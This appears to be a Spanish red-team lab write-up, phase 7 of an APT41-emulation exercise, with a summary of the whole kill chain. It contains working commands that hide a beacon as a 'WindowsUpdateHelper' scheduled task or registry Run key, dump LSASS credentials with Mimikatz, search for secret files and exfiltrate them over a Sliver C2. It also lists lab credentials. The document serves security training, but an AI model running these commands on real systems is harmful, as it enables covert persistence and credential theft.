# Persistence & Objective — Operación SILENT BRIDGE
## Fase 7 — Persistence + Objective Completion
**Operación:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adrián Camacho | **Fecha:** —  
**Objetivo:** Persistencia en PC Windows + exfiltración + prueba de compromiso final

---

## FASE 7 — Persistence & Objective Completion

**Tácticas MITRE:** TA0003 — Persistence / TA0009 — Collection  
**Prerrequisito:** Beacon Sliver activo en PC Windows (Fase 6)

---

### 7.1 — Persistence: Scheduled Task
**Técnica MITRE:** T1053.005  
**Captura:** `fase7-01-persistence-established.png`

```powershell
# Desde Evil-WinRM o sesión Sliver
# Crear tarea programada que ejecuta el beacon en cada inicio de sesión
schtasks /create \
  /tn "WindowsUpdateHelper" \
  /tr "C:\Users\<usuario>\AppData\Local\beacon_wreath.exe" \
  /sc onlogon \
  /ru <usuario> \
  /f

# Verificar tarea creada
schtasks /query /tn "WindowsUpdateHelper" /fo LIST
```

**Tarea creada:** ✅ / ❌  
**Nombre:** `WindowsUpdateHelper`  
**Trigger:** On Logon  

> **Alternativa — Registry Run Key (T1547.001):**
> ```powershell
> reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \
>   /v "WindowsHelper" \
>   /t REG_SZ \
>   /d "C:\Users\<usuario>\AppData\Local\beacon_wreath.exe" /f
> ```

---

### 7.2 — Credential Dumping local
**Técnica MITRE:** T1003.001 — LSASS Memory  
**Herramienta:** Sliver hashdump / Mimikatz  
**Captura:** `fase7-02-credential-dump.png`

```bash
# Desde sesión Sliver — si hay privilegios suficientes
sliver (<beacon>) > hashdump

# O via Evil-WinRM + Mimikatz
# Subir Mimikatz si Defender está deshabilitado
upload /opt/mimikatz/x64/mimikatz.exe
```

```powershell
# Mimikatz en memoria
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Hashes obtenidos:**

| Usuario | Hash NTLM | Tipo |
|---------|-----------|------|
| — | — | — |

---

### 7.3 — Data Collection / Exfiltración
**Técnica MITRE:** T1039 — Data from Network Shared Drive  
**Captura:** `fase7-03-data-exfiltration.png`

```powershell
# Enumerar datos de interés en el PC
dir C:\Users\ /s /b | findstr /i "password\|secret\|key\|config\|backup"
dir C:\inetpub\ /s /b 2>nul
dir "C:\Program Files\" /b

# Exfiltrar via Evil-WinRM download
download C:\Users\<usuario>\Desktop\<fichero>

# O via Sliver
sliver (<beacon>) > download C:\ruta\fichero.txt
```

**Ficheros exfiltrados:**

| Fichero | Ruta | Contenido |
|---------|------|-----------|
| — | — | — |

---

### 7.4 — Objective Proof — Prueba de compromiso
**Captura:** `fase7-04-objective-proof.png`

```powershell
# Prueba final de compromiso
whoami
whoami /groups
hostname
ipconfig
date /t && time /t
```

**Output esperado:**
```
<dominio o WORKGROUP>\<usuario>

Hostname: <PC_hostname>
IP:       <PC_IP>
```

---

### Resumen Fase 7 y operación completa

```
PERSISTENCE & OBJECTIVE — Estado final
════════════════════════════════════════════════════

PERSISTENCIA:
  Scheduled Task  → WindowsUpdateHelper ✅/⏳
  Registry Run    → ✅/❌ (alternativa)

CREDENCIALES VOLCADAS:
  [usuario] → [hash NTLM]

DATOS EXFILTRADOS:
  [fichero] → [descripción]

PRUEBA DE COMPROMISO:
  PC Windows [hostname] ([IP]) — [usuario] ✅/⏳
```

---

## Resumen global de la operación SILENT BRIDGE

```
KILL CHAIN COMPLETA
════════════════════════════════════════════════════════════════

[Kali 10.0.2.9]
  │
  │  Nmap → CVE-2019-15107
  ▼
[PROD 10.0.2.___]  ← shell root                    [FASE 1-2]
  │
  │  Ligolo-ng agent → túnel TLS :11601
  ▼
[Kali — proxy Ligolo]  ← ruta interna activa        [FASE 3]
  │
  │  Nmap interno → GIT server
  ▼
[GIT 10.0.2.___]  ← git history → credenciales     [FASE 4]
  │
  │  Evil-WinRM thomas:iamthegreatest
  ▼
[PC 10.0.2.___]  ← shell Windows                   [FASE 5]
  │
  │  Sliver beacon HTTPS vía túnel
  ▼
[C2 activo — SILENT BRIDGE]                         [FASE 6]
  │
  │  schtasks + credential dump + exfil
  ▼
[OBJETIVO COMPLETADO]                               [FASE 7]

TÉCNICAS MITRE — TOTAL OPERACIÓN:
  T1046, T1592.002, T1596     → Reconnaissance
  T1190                        → Initial Access (Webmin RCE)
  T1059.004, T1082, T1016     → Execution + Discovery (PROD)
  T1572, T1090, T1105         → Pivoting (Ligolo-ng)
  T1552.001, T1083, T1135     → Credential + File Discovery (GIT)
  T1078, T1021.006            → Lateral Movement (PC)
  T1071.001, T1573.002        → C2 (Sliver)
  T1587.001, T1204.002        → Implant deployment
  T1053.005, T1547.001        → Persistence
  T1003.001                    → Credential Dumping
  T1039                        → Data Collection
```

---

**Documentación siguiente:** [lessons_learned.md](lessons_learned.md) | [mitigations.md](mitigations.md)